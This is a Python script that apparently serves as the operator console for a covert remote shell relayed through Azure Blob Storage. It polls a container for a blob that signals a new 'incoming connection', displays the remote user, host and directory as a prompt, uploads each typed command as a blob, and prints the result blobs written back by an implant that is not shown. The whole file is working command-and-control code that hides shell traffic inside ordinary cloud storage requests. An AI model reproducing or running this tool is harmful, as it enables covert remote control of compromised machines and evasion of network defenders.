import os
import requests
import time
import re
import sys

# ANSI escape codes for colors
BLUE = '\033[34m'
GREEN = '\033[32m'
RESET = '\033[0m'

def get_env_or_prompt(var_name, prompt_message):
    """
    Retrieve environment variable or prompt user for the value if not set.
    """
    value = os.getenv(var_name)
    if value is None:
        value = input(prompt_message)
        if not value:
            raise ValueError(f"The value for {var_name} cannot be empty.")
    return value

def initialize_azure_storage_credentials():
    """
    Initialize Azure Storage credentials either from environment variables or user input.
    """
    global account_name, container_name, sas_token
    
    account_name = get_env_or_prompt('AZ_STORAGE_ACCOUNT_NAME', 'Enter Azure Storage Account Name: ')
    container_name = get_env_or_prompt('AZ_STORAGE_CONTAINER_NAME', 'Enter Azure Storage Container Name: ')
    sas_token = get_env_or_prompt('AZ_STORAGE_SAS_TOKEN', 'Enter Azure Storage SAS Token: ')

def list_blobs():
    """
    List all blob names in the container.
    """
    list_blobs_url = f"https://{account_name}.blob.core.windows.net/{container_name}?restype=container&comp=list&{sas_token}"
    
    try:
        response = requests.get(list_blobs_url)
        response.raise_for_status()
        blobs = re.findall(r'<Name>([^<]+)</Name>', response.text)
        return blobs
    except requests.RequestException as e:
        raise Exception(f"An error occurred while listing blobs: {e}")

def monitor_for_new_connection(start_blobs):
    """
    Monitor the container for a new blob that matches the naming schema and indicates a new incoming connection.
    """
    known_blobs = set(start_blobs)
    
    while True:
        blobs = list_blobs()
        new_blobs = set(blobs) - known_blobs
        if new_blobs:
            for blob in new_blobs:
                match = re.match(r'^(\d+)-0-result$', blob)
                if match:
                    timestamp = match.group(1)
                    print(f"\nIncoming connection with timestamp: {timestamp}.")
                    return timestamp
        
        # Print "." on the same line to indicate waiting
        sys.stdout.write(".")
        sys.stdout.flush()
        time.sleep(1)

def get_blob_contents(blob_name):
    """
    Download the contents of the blob with the given timestamp and suffix.
    """
    blob_url = f"https://{account_name}.blob.core.windows.net/{container_name}/{blob_name}?{sas_token}"
    
    try:
        response = requests.get(blob_url)
        response.raise_for_status()
        return response.text.strip()
    except requests.RequestException as e:
        raise Exception(f"An error occurred while fetching the blob {blob_name}: {e}")

def upload_blob(content, blob_name):
    """
    Upload the content to a new blob with the given timestamp and suffix.
    """
    blob_url = f"https://{account_name}.blob.core.windows.net/{container_name}/{blob_name}?{sas_token}"
    
    headers = {
        "x-ms-blob-type": "BlockBlob"
    }
    
    try:
        response = requests.put(blob_url, headers=headers, data=content)
        response.raise_for_status()
    except requests.RequestException as e:
        raise Exception(f"An error occurred while uploading the blob {blob_name}: {e}")

def get_prompt():
    """
    Get the prompt from the blob and apply color formatting.
    """
    # Get the prompt from the blob
    prompt_blob = f"{connection_start_timestamp}-0-result"
    prompt_format = get_blob_contents(prompt_blob)
    
    # Add color formatting
    try:
        # Assuming the format is something like "<whoami_result>@<hostname_result>:~<working_directory>$"
        user_and_host, rest_of_prompt = prompt_format.split(':~', 1)
        working_directory = rest_of_prompt
        
        prompt = (
            f"{BLUE}{user_and_host}{RESET}:~"
            f"{GREEN}{working_directory}{RESET} "
        )
    except ValueError:
        # If the format doesn't match, fallback to no color formatting
        prompt = prompt_format
    
    return prompt

def main():
    global connection_start_timestamp
    global connection_prompt

    initialize_azure_storage_credentials()
    
    # Initial retrieval of blobs
    start_blobs = list_blobs()
    
    # Monitor for new blob and get the timestamp
    connection_start_timestamp = monitor_for_new_connection(start_blobs)

    # Compute the prompt once
    connection_prompt = get_prompt()

    # Initialize command number
    command_number = 1

    while True:
        
        # Display the prompt
        user_input = input(connection_prompt)

        # Upload the command blob
        command_blob_name = f"{connection_start_timestamp}-{command_number}-command"
        upload_blob(user_input, command_blob_name)

        # Handle exit command
        if user_input.strip().lower() == 'exit':
            break

        # Monitor for result blob
        while True:
            result_blob_name = f"{connection_start_timestamp}-{command_number}-result" 
            blobs = list_blobs()
            if result_blob_name in blobs:
                result_content = get_blob_contents(result_blob_name)
                print(result_content, end='\n\n')
                break

        # Increment command number for the next command
        command_number += 1

    print("Exiting...")

if __name__ == "__main__":
    main()
